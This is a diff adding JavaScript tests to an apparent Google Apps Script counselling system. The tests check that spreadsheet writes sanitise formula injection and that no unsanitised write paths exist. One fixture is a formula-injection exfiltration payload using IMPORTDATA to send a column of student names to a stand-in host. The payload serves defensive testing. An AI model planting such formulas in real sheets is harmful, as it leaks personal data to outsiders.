@@ -457,6 +457,57 @@ test('[v9.49] hw_feedback 골격 — 학생확인(Glide 전용)과 포인트지�
   assert.ok(batch.includes('셀안전_(hwId), hwTagsClean_(card.error_tags), 셀안전_(reDo), hwRedoUrlOf_('), '수집 4칸이 적재 배열 끝에 오지 않거나 수식 인젝션 방어를 거치지 않는다');
 });
 
+/* ── [v9.153] 수식 인젝션 — 로스터 채널 소독 (2026-08-04 배포 보안 검토 기왕증 수리) ──
+ *   profiles A~O·Z·AY~BA·DT~DX는 상담시트 원문(이름 등 남의 글)을 writeIfChanged로 나른다.
+ *   호출부마다 셀안전_를 얹는 방식은 이 계열 7곳째 재발이라, 통로(writeIfChanged) 자체가 소독한다. */
+
+test('writeIfChanged는 문자열 셀만 셀안전_로 소독해 쓴다 — profiles 로스터 수식 인젝션 차단', () => {
+  // 실제 셀안전_(상담AI.js)·실제 writeIfChanged(Code.js)를 그대로 평가 — 구현 가정을 베끼면 같이 눈이 먼다
+  const 상담Src = fs.readFileSync(path.join(ROOT, '상담AI.js'), 'utf8');
+  const sFrom = 상담Src.indexOf('function 셀안전_');
+  assert.notEqual(sFrom, -1, '셀안전_ 정의(상담AI.js)를 찾지 못함 — writeIfChanged가 런타임에 부른다');
+  // 끝 표식은 다음 함수 심볼 — '\n}' 앵커는 본문에 블록이 생기는 순간 잘린 함수를 평가한다([v9.135] groupConsts와 같은 교훈)
+  const sTo = 상담Src.indexOf('function 상담_기록_(', sFrom);
+  assert.notEqual(sTo, -1, '셀안전_ 추출 끝 표식(상담_기록_)을 찾지 못함');
+  const 셀안전_ = new Function(상담Src.slice(sFrom, sTo) + '\nreturn 셀안전_;')();
+  const wic = loadFunction('function writeIfChanged(', 'function dstr(', 'writeIfChanged', { 셀안전_ });
+  const sheetOf = (cur) => { const w = []; return { writes: w, getRange: () => ({ getValues: () => cur.map(r => r.slice()), setValues: (v) => w.push(v) }) }; };
+  // ① 탐지 픽스처 — 실제 유출 페이로드 표기 그대로(셀안전_ 주석의 IMPORTDATA 시나리오)
+  const d = new Date(1750000000000);
+  let sh = sheetOf([['기존', '', 0, '']]);
+  assert.equal(wic(sh, 2, 1, [['=IMPORTDATA("http://x?d="&TEXTJOIN(",",1,B2:B60))', '안녕하세요', 3922, d]]), true);
+  assert.equal(sh.writes[0][0][0], "'=IMPORTDATA(\"http://x?d=\"&TEXTJOIN(\",\",1,B2:B60))", '수식 시작 문자열이 소독 없이 통과했다');
+  assert.equal(sh.writes[0][0][1], '안녕하세요', '평문까지 건드리면 안 된다');
+  assert.equal(sh.writes[0][0][2], 3922, '숫자가 문자열로 강제되면 안 된다(Glide 숫자 열 파괴)');
+  assert.equal(sh.writes[0][0][3], d, 'Date가 문자열로 강제되면 안 된다(created_at 등)');
+  // ② [v9.25] 무변경 skip 생존 — 아포스트로피 접두는 저장 시 소비돼 재독이 원문이므로, 비교는 소독 전 원문이어야 한다.
+  //    소독본 비교로 바꾸면 이 케이스가 매 실행 「다름」이 되어 로스터 블록 전체가 매일 재작성된다.
+  sh = sheetOf([['=foo', '평문']]);
+  assert.equal(wic(sh, 2, 1, [['=foo', '평문']]), false, '저장 후 재독(원문)과 같은데 다시 쓴다 — 원문 비교가 소독본 비교로 바뀌었다');
+  assert.equal(sh.writes.length, 0, '무변경인데 setValues가 호출됐다(쿼터 낭비)');
+});
+
+test('syncProfiles의 직접 setValues(exit_log·exit_snapshot)는 소독 채널(writeIfChanged)로 쓴다', () => {
+  const body = section('function syncProfiles()', 'function dailyBackup()');
+  assert.ok(/writeIfChanged\(exitSh,/.test(body), 'exit_log 기록(이름·반=상담시트 원문)이 소독 채널을 우회한다');
+  assert.ok(/writeIfChanged\(snapSh,/.test(body), 'exit_snapshot 기록(이름=원문 왕복값)이 소독 채널을 우회한다');
+  // raw 쓰기 검출기 — 문자열 리터럴을 먼저 지운다(안 지우면 'http://x' 뒤를 주석으로 오인해 같은 줄의 진짜 쓰기를 숨긴다 — 리뷰 실측 우회 사례).
+  //   리터럴 인자 setValue(상수 헤더)와 DT_HEADS 루프의 setValue(h)만 예외 — 리터럴은 남의 글일 수 없다.
+  const rawWrites = (src) => {
+    const stripped = src.replace(/'(?:\\.|[^'\\\n])*'|"(?:\\.|[^"\\\n])*"|`(?:\\.|[^`\\])*`|\/\*[\s\S]*?\*\/|\/\/[^\n]*/g,
+      (m) => (/^['"`]/.test(m) ? "''" : ''));
+    return (stripped.match(/\.(?:setValues?|appendRow|setFormulas?)\([^)\n]*/g) || [])
+      .filter((c) => c !== ".setValue(''" && c !== '.setValue(h');
+  };
+  // 탐지 능력 픽스처 — 리뷰에서 옛 가드를 실제로 통과했던 우회 3종이 전부 걸리는지 먼저 못박는다
+  assert.equal(rawWrites('dst.getRange(2, 200).setValue(row[0]);').length, 1, '단건 setValue 우회를 못 잡는다');
+  assert.equal(rawWrites('exitSh.appendRow([userId, row[0]]);').length, 1, 'appendRow 우회를 못 잡는다');
+  assert.equal(rawWrites("Logger.log('https://x'); d.getRange(9,9,1,1).setValues([[row[0]]]);").length, 1,
+    '문자열 안 //를 주석으로 오인해 같은 줄의 setValues를 놓친다');
+  assert.deepEqual(rawWrites(body), [],
+    'syncProfiles에 소독 채널(writeIfChanged) 밖의 시트 쓰기가 생겼다 — 남의 글이 raw로 실리는 새 경로(리터럴 setValue만 예외)');
+});
+
 test('[v9.49] 첨삭 확인 정산은 지급(appendPoints) 성공 뒤에만 지급완료로 표시한다', () => {
   const body = section('function sweepFeedbackAck_(', 'function aiFeedbackBatch_()');
   assertOrder(body, [
